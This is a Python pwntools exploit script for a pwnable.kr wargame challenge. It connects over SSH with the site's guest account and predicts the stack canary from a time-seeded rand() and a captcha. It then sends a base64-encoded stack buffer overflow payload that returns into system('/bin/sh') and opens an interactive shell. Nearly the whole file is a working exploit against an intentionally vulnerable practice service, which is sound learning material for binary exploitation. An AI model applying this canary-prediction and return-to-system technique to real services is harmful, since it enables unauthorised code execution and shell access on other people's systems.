#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL
import base64

SYSTEM_ADDR = 0x0804b018
EXIT_ADDR = 0x0804b078
G_BUF_ADDR = 0x0804b0e0
PROCESSHASH_ADDR = 0x08048F92

# context.log_level = 'debug'
libc = CDLL("libc.so.6")
def calc_canary(timestamp, captcha):
	libc.srand(timestamp)
	rands = []
	for i in range(8):
		rands.append(libc.rand())
	res = rands[1] + rands[5] # Correspond to the reverse code
	res += rands[2] - rands[3]
	res += rands[7]
	res += rands[4] - rands[6]
	canary = captcha - res
	if(canary<0):
		# negate used to change negative num to unsigned int value
		canary = util.fiddling.negate(-canary)
	return canary

# We first access to server through a ssh connection(any previous level provided account)
# I use the fix level's account :)
conn = ssh('fix', 'pwnable.kr', port=2222, password='guest')
# Call `date +%s` to get timestamp
get_time = conn.process('date +%s', shell=True)
# At the same time, execute the hash binary, in order to let them use the same timestamp
p = conn.connect_remote('127.0.0.1', 9002)


timestamp = int(get_time.recvline().strip('\n'))
get_time.close()

p.recvline() # remove the useless response
captcha = int(p.recvline().split(':')[1].strip(' '))
log.debug('The captcha is %d' % captcha)

canary = calc_canary(timestamp, captcha)
log.info('Calculate canary: %d(%s)' % (canary, hex(canary)))
if canary % 256 != 0:
	log.warning("Well, maybe it is not the right canary, let's try again")
	log.info("Recalculating canary...")
	for i in [1, -1, 2, -2, 3, -3]:
		log.info("Calculating canary with timestamp(%d)..." % (timestamp+i))
		canary = calc_canary(timestamp+i, captcha)
		if canary % 256 == 0:
			log.success('Now we are talking, the true canary is %d(%s)' % (canary, hex(canary)))
			break
		log.warning("Nop! Canary is not %d(%s)" % (canary, hex(canary)))

log.info('Start generating payload...')
# Great! We know the canary's value, now start generate the payload
# This need base64 encode
system_addr = p32(0x08049187)
bin_sh_addr = p32(0x0804B3AC) # We input the "/bin/sh" string and calculate its position
payload = 'A'* 512 # padding to fill the blank
payload += p32(canary) # Put the canary to where it needed to be, pretend the program is running normally
payload += 'B'*12 # padding again
payload += system_addr
payload += bin_sh_addr
payload = base64.b64encode(payload) # We need to encode payload before we input binsh string
payload += '/bin/sh\x00' # It good to know that binsh string is valid base64 string

log.info('Uploading payload...')
p.sendline(str(captcha))
p.sendline(payload)
p.recvuntil('MD5(data) :', timeout=2) # Filter all useless output to make screen clean
p.recvline(timeout=2)

p.interactive()